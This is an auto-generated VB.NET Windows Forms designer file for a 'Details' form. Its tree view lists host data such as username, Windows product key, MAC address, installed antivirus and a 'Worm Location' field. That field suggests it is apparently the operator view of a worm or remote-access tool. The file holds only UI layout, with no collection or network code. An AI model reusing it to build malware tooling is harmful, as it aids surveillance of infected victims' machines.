<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Details
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim TreeNode27 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Computer Name: ", 7, 7)
        Dim TreeNode28 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Username: ", 8, 8)
        Dim TreeNode29 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Virtual Screen Width: ", 11, 11)
        Dim TreeNode30 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Virtual Screen Height: ", 11, 11)
        Dim TreeNode31 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Available Physical Memory: ", 12, 12)
        Dim TreeNode32 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Available Virtual Memory: ", 12, 12)
        Dim TreeNode33 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Full Name: ", 1, 1)
        Dim TreeNode34 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Platform: ", 1, 1)
        Dim TreeNode35 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Version: ", 1, 1)
        Dim TreeNode36 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Total Physical Memory: ", 9, 9)
        Dim TreeNode37 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Total Virtual Memory: ", 9, 9)
        Dim TreeNode38 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Charge Status: ", 3, 3)
        Dim TreeNode39 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Full Lifetime: ", 2, 2)
        Dim TreeNode40 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Life Percent: ", 2, 2)
        Dim TreeNode41 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Life Remaining: ", 4, 4)
        Dim TreeNode42 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("CPU Info: ", 10, 10)
        Dim TreeNode43 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("GPU Name: ", 5, 5)
        Dim TreeNode44 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Uptime: ", 1, 1)
        Dim TreeNode45 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Computer Information", 14, 14, New System.Windows.Forms.TreeNode() {TreeNode27, TreeNode28, TreeNode29, TreeNode30, TreeNode31, TreeNode32, TreeNode33, TreeNode34, TreeNode35, TreeNode36, TreeNode37, TreeNode38, TreeNode39, TreeNode40, TreeNode41, TreeNode42, TreeNode43, TreeNode44})
        Dim TreeNode46 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Registered Owner: ", 16, 16)
        Dim TreeNode47 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Registered Organization: ", 17, 17)
        Dim TreeNode48 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Product Key: ", 18, 18)
        Dim TreeNode49 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("MAC Adress: ", 19, 19)
        Dim TreeNode50 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Installed AntiVirus Engine: ", 21, 21)
        Dim TreeNode51 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Worm Location: ", 22, 22)
        Dim TreeNode52 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Other Information", 6, 6, New System.Windows.Forms.TreeNode() {TreeNode46, TreeNode47, TreeNode48, TreeNode49, TreeNode50, TreeNode51})
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Details))
        Me.TreeView1 = New System.Windows.Forms.TreeView()
        Me.ImageList_Info = New System.Windows.Forms.ImageList(Me.components)
        Me.rightclick_Info = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.rightclick_Info.SuspendLayout()
        Me.SuspendLayout()
        '
        'TreeView1
        '
        Me.TreeView1.BackColor = System.Drawing.Color.Black
        Me.TreeView1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TreeView1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.TreeView1.ForeColor = System.Drawing.Color.Lime
        Me.TreeView1.FullRowSelect = True
        Me.TreeView1.ImageIndex = 13
        Me.TreeView1.ImageList = Me.ImageList_Info
        Me.TreeView1.Location = New System.Drawing.Point(0, 0)
        Me.TreeView1.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.TreeView1.Name = "TreeView1"
        TreeNode27.ImageIndex = 7
        TreeNode27.Name = "computername"
        TreeNode27.SelectedImageIndex = 7
        TreeNode27.Text = "Computer Name: "
        TreeNode28.ImageIndex = 8
        TreeNode28.Name = "username"
        TreeNode28.SelectedImageIndex = 8
        TreeNode28.Text = "Username: "
        TreeNode29.ImageIndex = 11
        TreeNode29.Name = "width"
        TreeNode29.SelectedImageIndex = 11
        TreeNode29.Text = "Virtual Screen Width: "
        TreeNode30.ImageIndex = 11
        TreeNode30.Name = "height"
        TreeNode30.SelectedImageIndex = 11
        TreeNode30.Text = "Virtual Screen Height: "
        TreeNode31.ImageIndex = 12
        TreeNode31.Name = "apm"
        TreeNode31.SelectedImageIndex = 12
        TreeNode31.Text = "Available Physical Memory: "
        TreeNode32.ImageIndex = 12
        TreeNode32.Name = "avm"
        TreeNode32.SelectedImageIndex = 12
        TreeNode32.Text = "Available Virtual Memory: "
        TreeNode33.ImageIndex = 1
        TreeNode33.Name = "osname"
        TreeNode33.SelectedImageIndex = 1
        TreeNode33.Text = "OS Full Name: "
        TreeNode34.ImageIndex = 1
        TreeNode34.Name = "osplattform"
        TreeNode34.SelectedImageIndex = 1
        TreeNode34.Text = "OS Platform: "
        TreeNode35.ImageIndex = 1
        TreeNode35.Name = "osversion"
        TreeNode35.SelectedImageIndex = 1
        TreeNode35.Text = "OS Version: "
        TreeNode36.ImageIndex = 9
        TreeNode36.Name = "tpm"
        TreeNode36.SelectedImageIndex = 9
        TreeNode36.Text = "Total Physical Memory: "
        TreeNode37.ImageIndex = 9
        TreeNode37.Name = "tvm"
        TreeNode37.SelectedImageIndex = 9
        TreeNode37.Text = "Total Virtual Memory: "
        TreeNode38.ImageIndex = 3
        TreeNode38.Name = "BCS"
        TreeNode38.SelectedImageIndex = 3
        TreeNode38.Text = "Battery Charge Status: "
        TreeNode39.ImageIndex = 2
        TreeNode39.Name = "bfl"
        TreeNode39.SelectedImageIndex = 2
        TreeNode39.Text = "Battery Full Lifetime: "
        TreeNode40.ImageIndex = 2
        TreeNode40.Name = "blp"
        TreeNode40.SelectedImageIndex = 2
        TreeNode40.Text = "Battery Life Percent: "
        TreeNode41.ImageIndex = 4
        TreeNode41.Name = "blr"
        TreeNode41.SelectedImageIndex = 4
        TreeNode41.Text = "Battery Life Remaining: "
        TreeNode42.ImageIndex = 10
        TreeNode42.Name = "cpu"
        TreeNode42.SelectedImageIndex = 10
        TreeNode42.Text = "CPU Info: "
        TreeNode43.ImageIndex = 5
        TreeNode43.Name = "gpu"
        TreeNode43.SelectedImageIndex = 5
        TreeNode43.Text = "GPU Name: "
        TreeNode44.ImageIndex = 1
        TreeNode44.Name = "uptime"
        TreeNode44.SelectedImageIndex = 1
        TreeNode44.Text = "Uptime: "
        TreeNode45.ImageIndex = 14
        TreeNode45.Name = "Knoten0"
        TreeNode45.SelectedImageIndex = 14
        TreeNode45.Text = "Computer Information"
        TreeNode46.ImageIndex = 16
        TreeNode46.Name = "Knoten1"
        TreeNode46.SelectedImageIndex = 16
        TreeNode46.Text = "Registered Owner: "
        TreeNode47.ImageIndex = 17
        TreeNode47.Name = "Knoten0"
        TreeNode47.SelectedImageIndex = 17
        TreeNode47.Text = "Registered Organization: "
        TreeNode48.ImageIndex = 18
        TreeNode48.Name = "Knoten1"
        TreeNode48.SelectedImageIndex = 18
        TreeNode48.Text = "Product Key: "
        TreeNode49.ImageIndex = 19
        TreeNode49.Name = "Knoten2"
        TreeNode49.SelectedImageIndex = 19
        TreeNode49.Text = "MAC Adress: "
        TreeNode50.ImageIndex = 21
        TreeNode50.Name = "Knoten4"
        TreeNode50.SelectedImageIndex = 21
        TreeNode50.Text = "Installed AntiVirus Engine: "
        TreeNode51.ImageIndex = 22
        TreeNode51.Name = "Knoten5"
        TreeNode51.SelectedImageIndex = 22
        TreeNode51.Text = "Worm Location: "
        TreeNode52.ImageIndex = 6
        TreeNode52.Name = "Knoten0"
        TreeNode52.SelectedImageIndex = 6
        TreeNode52.Text = "Other Information"
        Me.TreeView1.Nodes.AddRange(New System.Windows.Forms.TreeNode() {TreeNode45, TreeNode52})
        Me.TreeView1.SelectedImageIndex = 13
        Me.TreeView1.ShowNodeToolTips = True
        Me.TreeView1.Size = New System.Drawing.Size(914, 526)
        Me.TreeView1.TabIndex = 1
        '
        'ImageList_Info
        '
        Me.ImageList_Info.ImageStream = CType(resources.GetObject("ImageList_Info.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList_Info.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList_Info.Images.SetKeyName(0, "alarm-clock.png")
        Me.ImageList_Info.Images.SetKeyName(1, "application-monitor.png")
        Me.ImageList_Info.Images.SetKeyName(2, "battery.png")
        Me.ImageList_Info.Images.SetKeyName(3, "battery-charge.png")
        Me.ImageList_Info.Images.SetKeyName(4, "battery--exclamation.png")
        Me.ImageList_Info.Images.SetKeyName(5, "graphic-card.png")
        Me.ImageList_Info.Images.SetKeyName(6, "information.png")
        Me.ImageList_Info.Images.SetKeyName(7, "information-white.png")
        Me.ImageList_Info.Images.SetKeyName(8, "user.png")
        Me.ImageList_Info.Images.SetKeyName(9, "resource-monitor.png")
        Me.ImageList_Info.Images.SetKeyName(10, "processor.png")
        Me.ImageList_Info.Images.SetKeyName(11, "monitor.png")
        Me.ImageList_Info.Images.SetKeyName(12, "memory.png")
        Me.ImageList_Info.Images.SetKeyName(13, "selection.png")
        Me.ImageList_Info.Images.SetKeyName(14, "computer.png")
        Me.ImageList_Info.Images.SetKeyName(15, "information-shield.png")
        Me.ImageList_Info.Images.SetKeyName(16, "user-business.png")
        Me.ImageList_Info.Images.SetKeyName(17, "home-medium.png")
        Me.ImageList_Info.Images.SetKeyName(18, "key.png")
        Me.ImageList_Info.Images.SetKeyName(19, "address-book-blue.png")
        Me.ImageList_Info.Images.SetKeyName(20, "webcam.png")
        Me.ImageList_Info.Images.SetKeyName(21, "wall.png")
        Me.ImageList_Info.Images.SetKeyName(22, "arrow.png")
        '
        'rightclick_Info
        '
        Me.rightclick_Info.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.rightclick_Info.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem})
        Me.rightclick_Info.Name = "rightclick_Info"
        Me.rightclick_Info.Size = New System.Drawing.Size(151, 34)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.Image = CType(resources.GetObject("RefreshToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(150, 30)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'Details
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(914, 526)
        Me.Controls.Add(Me.TreeView1)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Details"
        Me.ShowIcon = False
        Me.Text = "Details"
        Me.rightclick_Info.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents TreeView1 As TreeView
    Friend WithEvents ImageList_Info As ImageList
    Friend WithEvents rightclick_Info As ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As ToolStripMenuItem
End Class
